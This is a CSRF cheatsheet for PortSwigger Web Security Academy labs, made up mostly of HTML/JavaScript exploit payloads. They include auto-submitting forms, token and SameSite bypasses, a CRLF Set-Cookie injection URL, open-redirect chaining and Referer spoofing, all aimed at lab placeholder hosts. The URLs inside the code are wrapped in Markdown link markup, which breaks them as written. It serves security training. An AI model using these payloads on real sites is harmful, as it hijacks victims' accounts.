# 🛡️ Cross-Site Request Forgery (CSRF) Cheatsheet

Complete methodology, token bypass techniques, SameSite restriction escapes, and Referer header spoofing for CSRF labs tested in PortSwigger Web Security Academy.

---

## 📌 Attack Vectors & Key Mechanisms

* **Trigger Sinks:** Auto-submitting HTML forms (`<form>`), `XMLHttpRequest`/`fetch()` with credentials.
* **Core Vulnerability:** Server relies solely on implicit session cookies without validating unpredictable request-specific tokens or origin headers.

---

## 🛠️ Detailed Breakdown & Payloads

### 1. Token Validation Bypasses

**CSRF vulnerability with no defenses**
Auto-submitting HTML form targeting privileged POST action:

```html
<form action="[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email)" method="POST">
    <input type="hidden" name="email" value="anything@web-security-academy.net" />
</form>
<script>
    document.forms[0].submit();
</script>
```

**CSRF where token validation depends on request method**
Convert POST request to GET to bypass server-side token enforcement:

```html
<form action="[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email)" method="GET">
    <input type="hidden" name="email" value="anything@web-security-academy.net" />
</form>
<script>
    document.forms[0].submit();
</script>
```

**CSRF where token validation depends on token being present**
Remove the csrf parameter entirely from the request body or URL:

```html
<form action="[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email)" method="POST">
    <input type="hidden" name="email" value="anything@web-security-academy.net" />
</form>
<script>
    document.forms[0].submit();
</script>
```

**CSRF where token is not tied to user session**
Obtain a valid CSRF token from your own session and inject it into the victim's request payload:

```html
<form action="[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email)" method="POST">
    <input type="hidden" name="email" value="anything@web-security-academy.net" />
    <input type="hidden" name="csrf" value="YOUR-ATTACKER-CSRF-TOKEN" />
</form>
<script>
    document.forms[0].submit();
</script>
```

**CSRF where token is tied to non-session cookie**
Exploit a secondary cookie injection vulnerability (e.g., search parameter) to set the victim's csrfKey cookie matching an attacker-controlled csrf token:

```html
<img src="[https://YOUR-LAB-ID.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrfKey=YOUR-ATTACKER-CSRF-KEY;%20SameSite=None](https://YOUR-LAB-ID.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrfKey=YOUR-ATTACKER-CSRF-KEY;%20SameSite=None)" onerror="document.forms[0].submit()">
<form action="[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email)" method="POST">
    <input type="hidden" name="email" value="anything@web-security-academy.net" />
    <input type="hidden" name="csrf" value="YOUR-ATTACKER-CSRF-TOKEN" />
</form>
```

**CSRF where token is duplicated in cookie**
Exploit cookie injection to overwrite the CSRF cookie so it matches the static token provided in the HTML form:

```html
<img src="[https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=pwned;%20SameSite=None](https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=pwned;%20SameSite=None)" onerror="document.forms[0].submit()">
<form action="[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email)" method="POST">
    <input type="hidden" name="email" value="anything@web-security-academy.net" />
    <input type="hidden" name="csrf" value="pwned" />
</form>
```

---

### 2. SameSite Restrictions Bypasses

**SameSite Lax bypass via method override**
Top-level cross-site navigations allow Lax cookies on GET requests; abuse HTTP method override parameters (`_method=POST`):

```html
<script>
    document.location = '[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=anything%40web-security-academy.net&_method=POST](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=anything%40web-security-academy.net&_method=POST)';
</script>
```

**SameSite Strict bypass via client-side redirect**
Chain an open redirect on the same site to turn a top-level cross-site GET request into a same-site request:

```html
<script>
    document.location = '[https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?post=foo&redirect=https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=anything%40web-security-academy.net](https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?post=foo&redirect=https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=anything%40web-security-academy.net)';
</script>
```

**SameSite Strict bypass via sibling domain**
Execute attack or weaponize WebSocket / XSS from an attacker-controlled or compromised sibling domain sharing the base origin context.

**SameSite Lax bypass via cookie refresh**
Force a top-level navigation opening target in a new window/tab right after session cookie issuance:

```html
<script>
    window.open('[https://YOUR-LAB-ID.web-security-academy.net/login](https://YOUR-LAB-ID.web-security-academy.net/login)');
    setTimeout(() => {
        document.forms[0].submit();
    }, 3000);
</script>
<form action="[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email)" method="POST">
    <input type="hidden" name="email" value="anything@web-security-academy.net" />
</form>
```

---

### 3. Referer Header Bypasses

**CSRF where Referer validation depends on header being present**
Suppress the Referer header using meta referrer policy in the exploit payload:

```html
<meta name="referrer" content="no-referrer">
<form action="[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email)" method="POST">
    <input type="hidden" name="email" value="anything@web-security-academy.net" />
</form>
<script>
    document.forms[0].submit();
</script>
```

**CSRF with broken Referer validation**
Bypass weak regex matching using `history.pushState()`:

```html
<script>
    history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net");
    document.forms[0].submit();
</script>
<form action="[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email)" method="POST">
    <input type="hidden" name="email" value="anything@web-security-academy.net" />
</form>
```
